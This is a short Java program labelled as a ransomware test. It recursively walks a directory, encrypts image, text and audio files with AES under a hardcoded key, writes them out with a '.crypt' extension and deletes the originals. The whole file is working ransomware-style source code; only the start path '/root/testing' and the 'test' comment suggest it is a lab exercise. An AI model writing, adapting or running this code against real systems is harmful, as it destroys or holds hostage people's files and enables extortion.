// Ransomware test - crypto

package crypto;

import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class main {

	private static final String ALGO = "AES";
	private static final byte[] keyValue = new byte[] { 'T', 'h', 'e', 'B', 'e', 's', 't','S', 'e', 'c', 'r','e', 't', 'K', 'e', 'y' };
	private static String[] listOfExt = {".txt",".jpg",".jpeg",".tif",".png",".gif",".tiff",".mp3","mpeg"}; 
	private static String extension = ".crypt";
	private static String startpath = "/root/testing";

	private static Key generateKey() throws Exception {
		
		
		Key key = new SecretKeySpec(keyValue, ALGO);
		return key;
	}

	private static void doCrypto(File inputFile, File outputFile) {
		try {
			Key secretKey = generateKey();
			Cipher cipher = Cipher.getInstance(ALGO);
			cipher.init(Cipher.ENCRYPT_MODE, secretKey);
			FileInputStream inputStream = new FileInputStream(inputFile);
			byte[] inputBytes = new byte[(int) inputFile.length()];
			inputStream.read(inputBytes);
			byte[] outputBytes = cipher.doFinal(inputBytes);
			FileOutputStream outputStream = new FileOutputStream(outputFile);
			outputStream.write(outputBytes);
			inputStream.close();
			outputStream.close();

		} catch (Exception E) {
		}
	}

	private static void run(String startpath){
		File inputFile;
		File outputFile;
		File folder = new File(startpath);
		File[] listOfFiles = folder.listFiles();
		for (int i = 0; i < listOfFiles.length; i++) {
			// is a file: 
			if (listOfFiles[i].isFile()) {
				for (int j=0; j< listOfExt.length; j++)
				{
					if (listOfFiles[i].toString().endsWith(listOfExt[j])){
						

						try{
							inputFile = new File(listOfFiles[i].getPath());
							outputFile = new File(listOfFiles[i].getPath() + extension);
							doCrypto(inputFile,outputFile);
							listOfFiles[i].delete();
							break;
						}
						catch (Exception E){
							System.out.println(E.getStackTrace());
						}
					}
				}		    
			} 
			// is a folder:
			else if (listOfFiles[i].isDirectory()) {
				run(listOfFiles[i].getPath());
			}
		}
	}

	public static void main(String[] args) {

		run (startpath);
	} 
}

